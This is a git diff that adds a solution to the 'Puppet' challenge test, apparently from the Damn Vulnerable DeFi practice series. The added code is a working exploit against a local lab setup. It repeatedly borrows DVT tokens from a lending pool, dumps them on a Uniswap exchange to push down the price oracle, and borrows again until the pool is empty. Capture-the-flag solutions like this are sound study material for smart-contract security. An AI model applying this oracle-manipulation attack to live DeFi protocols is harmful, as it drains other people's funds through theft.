@@ -102,18 +102,93 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
-    });
+        /** CODE YOUR EXPLOIT HERE */                                
+        let attackerETHBalance = await ethers.provider.getBalance(attacker.address);                
+        let borrowAmount = attackerETHBalance.div(2).sub(ethers.utils.parseEther('1'));
+
+        let attackerDVTBalance;
+        let poolDVTBalance;                
+        
+        // Borrow DVT until there is no more DVT left in the lending pool
+        while (borrowAmount > 0) {
+            attackerETHBalance = await ethers.provider.getBalance(attacker.address);                        
+            attackerDVTBalance = await this.token.balanceOf(attacker.address);
+            poolDVTBalance = await this.token.balanceOf(this.lendingPool.address);            
+
+            
+            // BORROW            
+            // borrowAmount = attackerETHBalance.div(2).sub(ethers.utils.parseEther('1'));
+            // let collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);
+
+            borrowAmount = attackerETHBalance;
+            let collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);
+
+            // let collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);            
+            // trying to find the right collateral amount by
+            // decreasing borrow amount by 1 and calling lending pool's `calculateDepositRequired` again
+            // since we will use the borrowed DVT to deposit on Uniswap Pool the oracle price of DVT/ETH
+            // will change continiously            
+            while (attackerETHBalance.lt(collateralAmount)) {                
+                borrowAmount = borrowAmount.sub(ethers.utils.parseEther('1'));
+                collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);                
+            }            
+            if (poolDVTBalance.lt(borrowAmount)) {
+                borrowAmount = poolDVTBalance;
+            }                                    
+
+            let tx = await this.lendingPool.connect(attacker).borrow(            
+                borrowAmount,
+                {value: collateralAmount}
+            );
+            let block = await ethers.provider.getBlock('latest');                
+            let minETHToReceive = await this.uniswapExchange.getTokenToEthInputPrice(
+                attackerDVTBalance,
+                { gasLimit: 1e6 }
+            );      
+            
+            // approve Uniswap to transfer DVT from attacker to UNI Pool
+            tx = await this.token.connect(attacker).approve(this.uniswapExchange.address, attackerDVTBalance);
+
+            // TRADE DVT FOR ETH
+            tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+                attackerDVTBalance,        
+                minETHToReceive,            
+                ethers.BigNumber.from(block.timestamp + 300),
+                { gasLimit: 100000 }
+            );                                    
+        }
+
+        // exchage all of attacker's ETH to get the DVT
+        // deposit ETH to get back DVT
+        attackerETHBalance = await ethers.provider.getBalance(attacker.address);
+        DVTOutputForETH = await this.uniswapExchange.getEthToTokenInputPrice(            
+            attackerETHBalance.sub(ethers.utils.parseEther('1')),
+            { gasLimit: 1e6 }
+        ); 
+                
+        const lastBlock = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());            
+        const deadline = lastBlock.timestamp + 84600;        
+        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(            
+            DVTOutputForETH,
+            deadline,
+            {value: attackerETHBalance.sub(ethers.utils.parseEther('1'))}
+        );                
+
+    }).timeout(-1);
+        
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
         // Attacker has taken all tokens from the pool        
-        expect(
+         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.eq('0');
+        
         expect(
             await this.token.balanceOf(attacker.address)
         ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
-    });
+    
+    }); 
+    
 });
